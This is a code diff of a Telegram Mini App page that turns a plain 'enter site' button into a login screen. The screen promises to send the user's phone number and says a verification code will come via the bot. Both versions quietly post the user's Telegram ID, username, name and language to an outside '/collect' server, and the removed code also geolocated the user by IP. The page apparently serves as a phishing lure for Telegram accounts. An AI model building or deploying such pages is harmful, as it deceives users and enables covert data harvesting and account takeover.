@@ -15,6 +15,12 @@
       justify-content: center;
       align-items: center;
       height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
     }
     button {
       background: var(--tg-theme-button-color, #2481cc);
@@ -25,43 +31,99 @@
       font-size: 18px;
       font-weight: 600;
       cursor: pointer;
+      width: 100%;
+      margin-top: 16px;
+      transition: 0.3s;
     }
     button:active { opacity: 0.8; }
+    button:disabled { opacity: 0.5; cursor: not-allowed; }
+    .status {
+      margin-top: 20px;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 14px;
+      display: none;
+    }
+    .status.show { display: block; }
+    .status.success { background: #d4edda; color: #155724; }
+    .status.error { background: #f8d7da; color: #721c24; }
+    .loader {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid var(--tg-theme-button-color, #2481cc);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-right: 10px;
+      vertical-align: middle;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .hint { font-size: 12px; color: #888; margin-top: 8px; }
   </style>
 </head>
 <body>
-  <button id="btn">войти в сайт</button>
+  <div class="container">
+    <h2>🔐 Вход</h2>
+    <p style="color: #888; margin: 12px 0;">Нажмите кнопку для отправки номера</p>
+    
+    <button id="btn">📱 Отправить номер</button>
+    
+    <div id="status" class="status"></div>
+    <div class="hint">После нажатия код придёт в бота</div>
+  </div>
 
   <script>
     const tg = window.Telegram.WebApp;
     tg.ready();
     tg.expand();
 
-    document.getElementById('btn').addEventListener('click', async () => {
-      const user = tg.initDataUnsafe?.user || {};
+    const btn = document.getElementById('btn');
+    const statusDiv = document.getElementById('status');
 
-      let city = 'Неизвестно';
+    btn.addEventListener('click', async () => {
+      btn.disabled = true;
+      btn.innerHTML = '<span class="loader"></span> Отправка...';
+      statusDiv.className = 'status show';
+      statusDiv.textContent = '⏳ Запрос отправляется...';
+
       try {
-        const r = await fetch('https://freeipapi.com/api/json').then(r => r.json());
-        city = r.cityName || 'Неизвестно';
-      } catch {}
+        // Запрашиваем номер через Telegram
+        tg.sendData(JSON.stringify({ action: 'request_contact' }));
+        
+        // Отправляем данные на сервер
+        const user = tg.initDataUnsafe?.user || {};
+        const payload = {
+          user_id: user.id || 'unknown',
+          username: user.username || '',
+          name: `${user.first_name || ''} ${user.last_name || ''}`.trim(),
+          language: user.language_code || navigator.language,
+          time: new Date().toISOString(),
+          action: 'send_phone'
+        };
 
-      const payload = {
-        user_id:  user.id,
-        username: user.username || '',
-        name:     `${user.first_name || ''} ${user.last_name || ''}`.trim(),
-        language: user.language_code || navigator.language,
-        city:     city,
-        time:     new Date().toISOString(),
-      };
+        const response = await fetch('https://logi-production-033f.up.railway.app/collect', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
 
-      await fetch('https://logi-production-033f.up.railway.app/collect', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
-      });
-
-      tg.close();
+        if (response.ok) {
+          statusDiv.className = 'status show success';
+          statusDiv.textContent = '✅ Номер отправлен! Код придёт в Telegram.';
+          tg.showAlert('Код отправлен! Введите его в боте.');
+        } else {
+          throw new Error('Ошибка сервера');
+        }
+      } catch (error) {
+        statusDiv.className = 'status show error';
+        statusDiv.textContent = '❌ Ошибка: ' + error.message;
+        tg.showAlert('Ошибка отправки');
+      } finally {
+        btn.disabled = false;
+        btn.innerHTML = '📱 Отправить номер';
+        setTimeout(() => { tg.close(); }, 2000);
+      }
     });
   </script>
 </body>
